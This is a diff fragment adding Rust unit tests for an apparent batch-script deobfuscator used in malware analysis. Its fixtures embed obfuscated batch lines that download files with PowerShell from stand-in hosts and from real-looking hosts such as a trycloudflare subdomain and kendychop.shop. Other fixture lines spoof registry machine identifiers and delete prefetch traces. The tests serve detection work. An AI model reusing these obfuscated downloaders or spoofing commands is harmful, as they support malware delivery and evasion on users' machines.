+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "repetitive cleanup should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 1976 repetitive admin cleanup commands"),
+            "cleanup run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert_live_admin_cap(&report.traits, 2000);
+    }
+
+    #[test]
+    fn alternating_del_and_rd_cleanup_loops_are_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..2000 {
+            script.push_str(&format!("del /q \"C:\\Temp\\Spam{idx}\\*\"\r\n"));
+            script.push_str(&format!(
+                "for /d %%x in (C:\\Temp\\Spam{idx}\\*) do @rd /s /q \"%%x\"\r\n"
+            ));
+        }
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 3,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "alternating cleanup should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 3976 repetitive admin cleanup commands"),
+            "cleanup loop run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert_live_admin_cap(&report.traits, 2000);
+    }
+
+    #[test]
+    fn dense_admin_cleanup_lines_are_summarized_across_noise() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..300 {
+            script.push_str(&format!(
+                "reg delete \"HKCU\\Software\\Spam\\{idx}\" /f\r\n"
+            ));
+            if idx % 8 == 0 {
+                script.push_str("echo checkpoint 2>nul\r\n");
+            }
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted dense admin cleanup command lines"),
+            "dense cleanup was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn dense_registry_identity_spoofing_cleanup_is_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..300 {
+            script.push_str(&format!(
+                "REG ADD HKLM\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid /t REG_SZ /d {idx}-{} /f\r\n",
+                idx + 1
+            ));
+            script.push_str(&format!(
+                "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName /v ComputerName /t REG_SZ /d Desktop{idx} /f\r\n"
+            ));
+            if idx % 10 == 0 {
+                script.push_str("echo checkpoint\r\n");
+            }
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted dense admin cleanup command lines"),
+            "dense registry identity spoofing cleanup was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.matches("REG ADD ").count() < 80,
+            "too many registry spoofing lines leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn embedded_csharp_batch_string_wrappers_are_stripped_from_deob() {
+        let script = br#"@echo off
+exit";
+public static string due = @"@echo off
+taskkill /f /im game.exe
+exit";
+public static string tre = @"@Echo off
+ipconfig /all >nul
+";
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.deobfuscated.contains("public static string"),
+            "C# wrapper syntax remained in deob:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem embedded C# batch string due"),
+            "embedded batch marker missing:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("taskkill /f /im game.exe")
+                && report.deobfuscated.contains("ipconfig /all >nul"),
+            "embedded batch commands were lost:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("exit\";"),
+            "C# string terminator remained attached to command:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("\";"),
+            "bare C# string terminator remained in deob:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn embedded_csharp_batch_string_verbatim_quotes_are_unescaped() {
+        let script = br#"@echo off
+public static string sei = @"@Echo off
+IF ""%PROCESSOR_ARCHITECTURE%"" EQU ""amd64"" (
+del ""C:\Windows\prefetch\reg.EXE-0AC99A87.pf"",
+reg delete ""HKLM\SOFTWARE\Epic Games"" /f
+";
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(r#"IF "AMD64" EQU "amd64" ("#),
+            "C# verbatim quotes in IF command were not unescaped:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"del "C:\Windows\prefetch\reg.EXE-0AC99A87.pf","#),
+            "C# verbatim quotes in del command were not unescaped:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains(r#"reg delete "HKLM\SOFTWARE\Epic Games" /f"#),
+            "C# verbatim quotes in reg command were not unescaped:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(r#""""#),
+            "C# verbatim doubled quotes leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn embedded_csharp_residual_data_rows_are_summarized() {
+        let script = br#"@echo off
+public static string tre = @"@echo off
+for /f ""delims=: tokens=*"" %%A in ('findstr /b ::: ""%~f0""') do @echo(%%A
+{c403512a-5906-4795-92c4-7ab8289ad538}\apps.csg"",
+\Critical_10.0.18362.411_1_3d6901e11d91b131dc12ed0eb6c4813e1f2c6_00000000_ae9bff9d-3843-4303-9058-46cbde99eb19\Report.wer"",
+\Critical_10.0.18362.411_1_3d6901e11d91b131dc12ed0eb6c4813e1f2c6_00000000_ae9bff9d-3843-4303-9058-46cbde99eb19"",
+ipconfig /all >nul
+";
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 3 embedded C# residual data rows"),
+            "embedded residual data rows were not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("apps.csg")
+                && !report.deobfuscated.contains("Report.wer"),
+            "embedded residual data rows leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("ipconfig /all >nul"),
+            "real command after residual rows was lost:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn single_embedded_csharp_residual_data_row_is_preserved() {
+        let script = br#"@echo off
+public static string tre = @"@echo off
+\Critical_10.0.18362.411_1_3d6901e11d91b131dc12ed0eb6c4813e1f2c6_00000000_ae9bff9d-3843-4303-9058-46cbde99eb19"",
+ipconfig /all >nul
+";
+"#;
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("Critical_10.0.18362.411"),
+            "single residual row should be preserved rather than silently dropped:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("embedded C# residual data rows"),
+            "single residual row should not be summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("ipconfig /all >nul"),
+            "real command after single residual row was lost:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn dense_broken_registry_hardware_fragments_are_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..120 {
+            script.push_str("ven_10ec\r\n");
+            script.push_str("dev_0290\r\n");
+            script.push_str("subsys_103c80df\r\n");
+            script.push_str("rev_1000#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\\singlelineouttopo/00010001|\\Device\\HarddiskVolume3\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exeb{00000000-0000-0000-0000-000000000000}\"\"\"\" /f\r\n");
+            script.push_str("Visual Studio\"\"\"\" /f\r\n");
+            script.push_str("Display settings\"\"\"\" /f\r\n");
+            script.push_str("rsonalize\"\"\"\" /f\r\n");
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("repetitive admin cleanup commands"),
+            "dense broken registry fragments were not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.matches("ven_10ec").count() < 20,
+            "too many broken registry fragments leaked into deob output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn large_hex_rem_tail_is_summarized_before_timeout() {
+        let mut script = String::from("@echo off\r\necho ok\r\n");
+        for idx in 0..20_000u32 {
+            script.push_str("REM ");
+            script.push_str(&"0123456789abcdef".repeat(8));
+            script.push_str(&format!("{idx:08x}\r\n"));
+        }
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "hex REM tail should be summarized before timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.len() < 4096,
+            "hex REM tail leaked into deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn opaque_payload_tail_line_is_summarized_before_scans() {
+        let payload =
+            "xuIpfKHZiU0UHzp86jJZ@HD6sEClRxknzn#lhmsjs@pMqul6g2E4eo63rt8acWUjmwP9ZkrsrH1aEjUm"
+                .repeat(2048);
+        let script = format!("@echo off\r\necho ready\r\nexit /b\r\n{payload}\r\n");
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 3,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "opaque payload tail should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 163840 opaque payload bytes"),
+            "opaque payload tail was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(
+                |t| matches!(t, Trait::LineTruncated { original_len } if *original_len == 163840)
+            ),
+            "missing LineTruncated marker: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn post_exit_alpha_echo_word_salad_is_suppressed_without_hiding_prior_commands() {
+        let payload = "nbvcxzasdfghjklpoiuytrewq1234567890".repeat(48);
+        let mut script = String::from(
+            "@echo off\r\npowershell -Command \"iwr https://example.test/stage.ps1\"\r\nexit\r\n",
+        );
+        for _ in 0..8 {
+            script.push_str("echo ");
+            script.push_str(&payload);
+            script.push_str("\r\n");
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("powershell -Command"),
+            "command before post-exit noise was hidden:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&payload[..256]),
+            "post-exit alpha echo word-salad leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "suppressed post-exit noise should be recorded: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn marker_polluted_set_command_still_assigns_variables_for_later_expansion() {
+        let script = concat!(
+            "@echo off\r\n",
+            "sÅeçt \"cmdUrl=https://example.test/startupppp.bat\"\r\n",
+            "set \"cmdDestination=C:\\Users\\Public\\startupppp.bat\"\r\n",
+            "powershell -Command \"Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%'\"\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://example.test/startupppp.bat"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\startupppp.bat")
+                )
+            }),
+            "marker-polluted set did not feed later PowerShell download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn marker_substring_set_assignments_are_not_summarized_as_binary_noise() {
+        let script = concat!(
+            "@set \"Å=0set \"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"cmdUrl=https://x.test/a.bat\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"cmdDestination=C:\\u\\a.bat\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"unusedOne=C:\\u\\unused-one.dat\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"PWSUrl=https://x.test/b.vbs\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"PWSDestination=C:\\u\\b.vbs\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"unusedTwo=C:\\u\\unused-two.dat\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"PWS1Url=https://x.test/c.vbs\"\r\n",
+            "%Å:~1,1%%Å:~2,1%%Å:~3,1%%Å:~4,1%\"PWS1Destination=C:\\u\\c.vbs\"\r\n",
+            "powershell -Command \"Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%'\"\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://x.test/a.bat"
+                            && dst.as_deref() == Some("C:\\u\\a.bat")
+                )
+            }),
+            "marker-substring set assignments were hidden by binary-noise summary: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn marker_substring_alphabet_set_carrier_is_not_binary_noise() {
+        let line = concat!(
+            "%Å:~0,1%%Å:~1,1%%Å:~2,1%%Å:~3,1%",
+            "%Å:~4,1%%Å:~5,1%%Å:~6,1%%Å:~7,1%",
+            "%Å:~8,1%%Å:~9,1%%Å:~10,1%%Å:~11,1%",
+            "%Å:~12,1%%Å:~13,1%%Å:~14,1%%Å:~15,1%",
+            "\"nextAlphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@ \"",
+        );
+
+        assert!(
+            !crate::is_binary_noise_line(line),
+            "dense marker-substring SET alphabet carrier should be interpreted, not summarized"
+        );
+    }
+
+    #[test]
+    fn non_ascii_marker_islands_inside_variable_names_still_expand_substrings() {
+        const TRIGGER_PERCENT_SUMMARY_LINE: &[u8] = b"%RD\xC3A:~26,1%%RD\xC3A:~10,1%%RD\xC3A:~43,1%%RD\xC3A:~35,1%%RD\xC3A:~57,1%%RD\xC3A:~49,1%.%RD\xC3A:~9,1%%RD\xC3A:~3,1%%bA\xC3L\xA2\xA7\xC3%%RD\xC3A:~9,1%%RD\xC3A:~45,1%%RD\xC3A:~42,1%%RD\xC3A:~11,1%-%RD\xC3A:~3,1%%RD\xC3A:~31,1%%RD\xC3A:~58,1%.%RD\xC3A:~26,1%%RD\xC3A:~10,1%\r\n";
+        let mut script = b"@set \"RD\xC3A=8EHxLCbizey6mOlMXjY91fPuTGp7srSwkJQhvcRqdK4tB UFZnag2NA50o3IVDW@\"\r\n\
+%RD\xC3A:~28,1%%\xC3\xA4F\xC3\xC3E\xBB%%RD\xC3A:~9,1%%RD\xC3A:~43,1%%RD\xC3A:~45,1%\
+\"%RD\xC3A:~21,1%%RD\xC3A:~43,1%%RD\xC3A:~28,1%%RD\xC3A:~26,1%%RD\xC3A:~46,1%%RD\xC3A:~29,1%%RD\xC3A:~14,1%\
+=%RD\xC3A:~35,1%%RD\xC3A:~43,1%%RD\xC3A:~43,1%%RD\xC3A:~26,1%%RD\xC3A:~28,1%\
+://indices-california-cooked-actively.trycloudflare.com/FTSP.zip\"\r\n\
+powershell -Command \"Invoke-WebRequest -Uri '%ftspUrl%' -OutFile 'C:\\Users\\Public\\FTSP.zip'\"\r\n"
+            .to_vec();
+        for _ in 0..8 {
+            script.extend_from_slice(TRIGGER_PERCENT_SUMMARY_LINE);
+        }
+
+        let report = analyze(&script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(
+                "set \"ftspUrl=https://indices-california-cooked-actively.trycloudflare.com/FTSP.zip\""
+            ),
+            "marker-island var name did not decode the substring set command:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .deobfuscated
+                .contains("=://indices-california-cooked-actively"),
+            "malformed URL fragment leaked after substring expansion:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://indices-california-cooked-actively.trycloudflare.com/FTSP.zip"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\FTSP.zip")
+                )
+            }),
+            "decoded cmdUrl did not feed the PowerShell download trait: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn stripped_ascii_marker_name_still_expands_unique_alphabet_substrings() {
+        let script = b"@echo off\r\n\
+@set \"q\xC3\xC3=PlBOr7ndfgit2H3 F4aJGIZypLz019R5qwUDWTsuYEbAm6M8KxkXNhScvej@oCVQ\"\r\n\
+set \"%q:~8,1%%q:~11,1%%q:~38,1%%q:~24,1%%q:~34,1%%q:~4,1%%q:~1,1%=%q:~53,1%%q:~11,1%%q:~11,1%%q:~24,1%://kendychop.shop:9135/FTSP.zip\"\r\n\
+set \"%q:~8,1%%q:~11,1%%q:~38,1%%q:~24,1%%q:~7,1%%q:~57,1%%q:~38,1%%q:~11,1%%q:~10,1%%q:~6,1%%q:~18,1%%q:~11,1%%q:~10,1%%q:~60,1%%q:~6,1%=%USERPROFILE%\\%q:~35,1%%q:~60,1%%q:~33,1%%q:~6,1%%q:~1,1%%q:~60,1%%q:~18,1%%q:~7,1%%q:~38,1%\\%q:~16,1%%q:~37,1%%q:~54,1%%q:~0,1%.%q:~26,1%%q:~10,1%%q:~24,1%\"\r\n\
+powershell -Command \"Invoke-WebRequest -Uri '%ftspUrl%' -OutFile '%ftspdestination%'\"\r\n";
+
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("set \"ftspUrl=http://kendychop.shop:9135/FTSP.zip\""),
+            "stripped marker alphabet name did not decode set variable:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("Invoke-WebRequest -Uri ''"),
+            "PowerShell command kept empty URI after marker substring expansion:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://kendychop.shop:9135/FTSP.zip"
+                            && dst.as_deref() == Some(
+                                "C:\\Users\\puncher\\Downloads\\FTSP.zip"
+                            )
+                )
+            }),
+            "decoded FTSP download trait was not emitted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn marker_built_set_prefix_with_noise_still_assigns_ascii_alias_substrings() {
+        let script = b"@echo off\r\n\
+@set \"q\xC3\xC3=PlBOr7ndfgit2H3 F4aJGIZypLz019R5qwUDWTsuYEbAm6M8KxkXNhScvej@oCVQ\"\r\n\
+%q\xC3\xC3:~38,1%%q\xC3\xC3:~57,1%%q\xC3\xC3:~11,1%%\xC3z\x91\xC3\xAFY\xC3%%q\xC3\xC3:~15,1%\"%q\xC3\xC3:~8,1%%q\xC3\xC3:~11,1%%q\xC3\xC3:~38,1%%q\xC3\xC3:~24,1%%q\xC3\xC3:~34,1%%q\xC3\xC3:~4,1%%q\xC3\xC3:~1,1%=%q\xC3\xC3:~53,1%%q\xC3\xC3:~11,1%%q\xC3\xC3:~11,1%%q\xC3\xC3:~24,1%://kendychop.shop:9135/FTSP.zip\r\n\
+powershell -Command \"Invoke-WebRequest -Uri '%ftspUrl%' -OutFile 'C:\\Users\\Public\\FTSP.zip'\"\r\n";
+
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("set \"ftspUrl=http://kendychop.shop:9135/FTSP.zip"),
+            "marker-built set prefix did not assign ftspUrl:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://kendychop.shop:9135/FTSP.zip"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\FTSP.zip")
+                )
+            }),
+            "decoded FTSP download trait was not emitted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn assignments_after_unresolved_errorlevel_exit_block_feed_later_commands() {
+        let script = concat!(
+            "@echo off\r\n",
+            "if %ERRORLEVEL% neq 0 (\r\n",
+            "  echo failed\r\n",
+            "  exit /b 1\r\n",
+            ")\r\n",
+            "set \"cmdUrl=https://example.test/startupppp.bat\"\r\n",
+            "set \"cmdDestination=C:\\Users\\Public\\startupppp.bat\"\r\n",
+            "powershell -Command \"Invoke-WebRequest -Uri '%cmdUrl%' -OutFile '%cmdDestination%'\"\r\n",
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://example.test/startupppp.bat"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\startupppp.bat")
+                )
+            }),
+            "assignment after unresolved exit block did not feed later command: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn huge_post_terminal_marker_payload_uses_fast_tail_path() {
+        let payload =
+            "xuIpfKHZiU0UHzp86jJZ@HD6sEClRxknzn#lhmsjs@pMqul6g2E4eo63rt8acWUjmwP9ZkrsrH1aEjUm"
+                .repeat(4096);
+        assert!(super::is_huge_post_terminal_opaque_payload_line(&payload));
+        assert!(!super::is_huge_post_terminal_opaque_payload_line(
+            "powershell -nop -w hidden"
+        ));
+    }
+
+    #[test]
+    fn utf16le_percent_carrier_is_summarized_before_timeout() {
+        let payload = "%A%%B%".repeat(100_000);
+        let script = format!(
+            "@echo off\r\nset A=x\r\nset B=y\r\nsetlocal EnableDelayedExpansion\r\ncls\r\necho {payload}\r\n"
+        );
+        let mut utf16 = Vec::with_capacity(script.len() * 2);
+        for unit in script.encode_utf16() {
+            utf16.extend_from_slice(&unit.to_le_bytes());
+        }
+
+        let report = analyze(
+            &utf16,
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "UTF-16 carrier should be summarized before timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("rem omitted"),
+            "UTF-16 percent carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn bom_prefixed_ascii_percent_carrier_is_summarized_before_timeout() {
+        let payload = "%A%%B%".repeat(200_000);
+        let script = format!(
+            "@echo off\r\nset A=x\r\nset B=y\r\nsetlocal EnableDelayedExpansion\r\ncls\r\n{payload}\r\n"
+        );
+        let mut bytes = b"\xff\xfe".to_vec();
+        bytes.extend_from_slice(script.as_bytes());
+
+        let report = analyze(
+            &bytes,
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "BOM-prefixed ASCII carrier should be summarized before timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted long unresolved percent-noise line"),
+            "BOM-prefixed ASCII percent carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn long_alphanumeric_echo_noise_is_summarized_before_scans() {
+        let payload = "mnbvcxzasdfghjklpoiuytrewq1234567890".repeat(4096);
+        let script = format!("@echo off\r\necho {payload}\r\n");
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 2,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "alphanumeric echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 147456 bytes from long alpha echo line"),
+            "alphanumeric echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn low_alphabet_echo_noise_is_summarized_before_scans() {
+        let payload = "abcdefohhyklmndsd".repeat(32768);
+        let script = format!("@echo off\r\necho {payload}\r\n");
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "low-alphabet echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(&format!(
+                "rem omitted {} bytes from long alpha echo line",
+                payload.len()
+            )),
+            "low-alphabet echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn repetitive_alpha_echo_noise_is_summarized_before_scans() {
+        let payload = "abcdefghijklmnopqrstuvwxyz".repeat(32768);
+        let script = format!("@echo off\r\necho{payload}\r\n");
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "repetitive alpha echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(&format!(
+                "rem omitted {} bytes from long alpha echo line",
+                payload.len()
+            )),
+            "repetitive alpha echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn repetitive_punctuation_echo_noise_is_summarized_before_scans() {
+        let payload = "?".repeat(8192);
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..8 {
+            script.push_str("echo ");
+            script.push_str(&payload);
+            script.push_str(">>C:\\Users\\Public\\noise.bin\r\n");
+        }
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "punctuation echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(&format!(
+                "rem omitted {} bytes from 8 repetitive echo noise lines",
+                payload.len() * 8
+            )),
+            "punctuation echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn c_style_junkcode_echo_runs_are_summarized_before_scans() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..160 {
+            script.push_str(&format!("echo \tfloat pJunkcode = {idx:06};\r\n"));
+            script.push_str(&format!("echo \tpJunkcode = {};\r\n", idx * 4096));
+            script.push_str(&format!("echo \tif (pJunkcode = {});\r\n", idx * 8192));
+        }
+        script.push_str("powershell -c \"Write-Host keep\"\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 480 C-style junkcode echo lines"),
+            "junkcode echo run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("powershell -c"),
+            "command after junkcode run was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("pJunkcode = 4096"),
+            "raw junkcode leaked into output:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn repeated_blank_echo_spacers_are_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..120 {
+            script.push_str("echo.\r\n");
+        }
+        script.push_str("powershell -c \"Write-Output kept\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 120 blank echo spacer lines"),
+            "blank echo spacer run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.matches("echo.").count() <= 2,
+            "raw blank echo spacer lines leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("powershell -c"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn split_plain_alpha_echo_noise_run_is_summarized_before_scans() {
+        let echo_payload = "abcdefghijklmnopqrstuvwxyz".repeat(12_400);
+        let continuation = "nfnrnovipttnfbudsdsftbysxpzusgtjdvj".repeat(3_200);
+        let script = format!(
+            "@echo off\r\necho {echo_payload}\r\n{continuation}\r\npowershell -c \"iwr https://alpha-noise.example/p.ps1\"\r\n"
+        );
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://alpha-noise.example/p.ps1")
+            }),
+            "command after alpha noise was not preserved: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("bytes from long plain alpha noise line"),
+            "split alpha echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&echo_payload[..512]),
+            "raw alpha echo noise leaked into output"
+        );
+        assert!(
+            !report.deobfuscated.contains(&continuation[..512]),
+            "raw alpha continuation noise leaked into output"
+        );
+    }
+
+    #[test]
+    fn medium_plain_alpha_noise_line_is_summarized() {
+        let noise = "nfnrnovipttnfbudsdsftbysxpzusgtjdvj".repeat(128);
